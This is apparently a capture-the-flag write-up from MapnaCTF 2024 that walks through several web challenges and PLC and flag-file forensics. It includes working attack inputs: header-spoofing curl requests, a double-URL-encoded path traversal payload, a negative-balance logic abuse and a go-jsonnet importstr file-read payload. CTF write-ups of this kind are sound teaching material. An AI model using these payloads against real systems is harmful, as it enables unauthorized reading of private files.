Multiple members of IrisSec and myself (a new member of IrisSec!) participated in MapnaCTF 2024 and placed 2nd! This writeup only contains the challenges I personally solved or contributed to. I hope you enjoy!

You can join the Discord community for this CTF (with more writeups!) [here](https://discord.gg/tBGyp7pP2y).

## Web/Flag Holding (289 solves)
> Hopefully you know how web works...

Initially with the webserver given I visit the page, and this particular portion of text is displayed:

`You are not coming from "http://flagland.internal/‚Äù`

I move to cURL to do this challenge, and determine this is probably referring to the `Referer` header.

```
$ curl "http://18.184.219.56:8080/" -H "Referer: http://flagland.internal/"
Unspecified "secret".
```

Interesting, I make a new parameter `secret` and set it with a value of `1`.

```
$ curl "http://18.184.219.56:8080/?secret=1" -H "Referer: http://flagland.internal/"
Incorrect secret. <!-- hint: secret is ____ which is the name of the protocol that both this server and your browser agrees on... ‚Äî>
```

The hint is likely to be filled with `http`.

```
$ curl "http://18.184.219.56:8080/?secret=http" -H "Referer: http://flagland.internal/"
Sorry we don't have "GET" here but we might have other things like "FLAG‚Äù.
```

I change the method from `GET` to `FLAG`.

```
$ curl -X FLAG "http://18.184.219.56:8080/?secret=http" -H "Referer: http://flagland.internal/"
MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}
```

There we go!

Flag: <mark>MAPNA{533m5-l1k3-y0u-kn0w-h77p-1836a2f}</mark>

## Web/Novel reader (119 solves)
> We have many fun novels for ya...

The website seems to be an article reader with one article we cannot read, and we can only read a few words with our balance.

![Home Page](novel-reader-1.png)

I look into the web request for the article reading and the source code has the following segment:

```python
name = unquote(name)
if(not name.startswith('public/')):
    return {'success': False, 'msg': 'You can only read public novels!'}, 400
```

`unquote` from `urllib.parse` and does URL decoding, so we can avoid that with layering of url encoding. Eg. `%2e` -> `%252e`

We then see that the path has to start with `public/` to be read.

We can achieve path traversal to read the flag using the following payload: `public/%252e%252e/%252e%252e/flag.txt`

Making the final web request to `/api/read/public/%252e%252e/%252e%252e/flag.txt` gives us the flag.

## Web/Novel reader 2 (104 solves)
> Submit the second flag of "Novel Reader" here

The same website also has another file we have to read inside `private/A-Secret-Tale.txt`

Looking at the word balance, we can seem to set negative values by purchasing `-100` words, for example.

The source code for reading the file is as follows:

```python
buf = readFile(name).split(' ')
buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
```

If we make `session['words_balance']` equal to `-1` we can read the whole file!

I set my word balance to -1 and then use the path traversal vulnerability to read the file.

## Web/Advanced JSON Cutifier (74 solves)
> My homework was to write a JSON beautifier. Just Indenting JSON files was too boring that's why I decided to add some features to my project using a popular (More than 1k stars on GitHub!! ) library to make my project more exciting. Important: You can't read any file other than /flag.txt on the remote environment.

Looking at the source code provided first we can see a redacted Go library from github.

```go
import (
    "net/http"
    "github.com/gin-gonic/gin"
    "github.com/REDACTED/REDACTED"
)
```

I cause some errors on the server to try and identify the library:
```
Expected token OPERATOR but got "}"
Expected a comma before next field
```

Both these errors point towards the [go-jsonnet](https://github.com/google/go-jsonnet) library, which meets the stars requirement in the challenge description.

I end up looking for ways to read files in the issues section of the repo and find [this issue](https://github.com/google/go-jsonnet/issues/337).

It mentions a payload like the following:

```json
{
    "wow so advanced!!": importstr "/flag.txt‚Äù
}
```

Running it in the parser we are given the flag:

```json
{
   "wow so advanced!!": "MAPNA{5uch-4-u53ful-f347ur3-a23f98d}\n\n"
}
```

Flag: <mark>MAPNA{5uch-4-u53ful-f347ur3-a23f98d}</mark>

## Forensics/Tampered (48 solves)
> Our MAPNA flags repository was compromised, with attackers introducing one invalid flag. Can you identify the counterfeit flag? Note: Forgot the flag format in the rules pages, just find the tampered one. You are not allowed to brute-force the flag in scoreboard, this will result in your team being blocked.

Looking through the given files, we are given a very long list of flags.

Basics scan show nothing out of the ordinary in flag format or length, so I look into the newlines after each flag.

I write a basic script to split all lines by the common ending `\r\r\n` and if any of the strings don't meet the expected length, to print them.

```python
with open('flags.txt','rb') as f:
    d=f.read().split(b'\r\r\n')
    for x in d:
        if x != b'':
            if len(x) != 47:
                print(x)
```

```
$ python3 check.py
b'MAPNA{Tx,D51otN\\eUf7qQ7>ToSYQ\\;5P6jTIHH#6TL+uv}\r\n\rMAPNA{R6Z@//\\>caZ%%k)=ci3$IyOkSGK%w<"V7kgesY&k}‚Äô
```

We can see one flag ends with `\r\n\r`, which is our out of place flag.

## Forensics/PLC I ü§ñ (355 solves)
> The MAPNA CERT team has identified an intrusion into the plant's PLCs, discovering a covert message transferred to the PLC. Can you uncover this secret message?

If we open the given PCAP we can look at it in Wireshark, looking at the packets, we can see in some of them small segments of data.

![Data](plc-1.png)

After looking through all the packets I see the following:

- `3:Ld_4lW4` (Packet 19)
- `5:3__PaAD` (Packet 31)
- `1:MAPNA{y` (Packet 35)
- `4:yS__CaR` (Packet 39)
- `6:d1n9!!}` (Packet 46)
- `2:0U_sHOu` (Packet 50)

Compiled together in the numerical order we get the flag.

Flag: <mark>MAPNA{y0U_sHOuLd_4lW4yS__CaR3__PaADd1n9!!}</mark>

## Forensics/PLC II ü§ñ (11 solves)
> After extensive investigations, the MAPNA forensics team discovered that the attackers attempted to manipulate the PLC time. Please identify the precise time in the following format: year:month:day:hour:minute:second:millisecond. The flag is MAPNA{sha256(datetime)}.

Looking into the data inside the packets, we see that the first two packets start with `03000016`. I looked this up on GitHub and found some [scripts](https://github.com/tijldeneut/ICSSecurityScripts/blob/03cf22205e11629cdee661d87d969176b409abc6/SiemensScan.py#L562).

This lead me down to [S7comm](https://wiki.wireshark.org/S7comm) and in the examples section was [example time setting traffic](https://wiki.wireshark.org/uploads/__moin_import__/attachments/SampleCaptures/s7comm_reading_setting_plc_time.pcap).

I compare the raw TCP of the example traffic to the given traffic and only 1 line isn't similar.

The portion of the example data that was different (`00191408201159330400`) is a date as parsed in Wiresharks S7comm parsing. 

![PLC2](plc-2.png)

Looking at our file we see `00202309211959299490` which can be parsed to `2023:09:21:19:59:29:949`.

SHA256 sum of that gives us our flag.
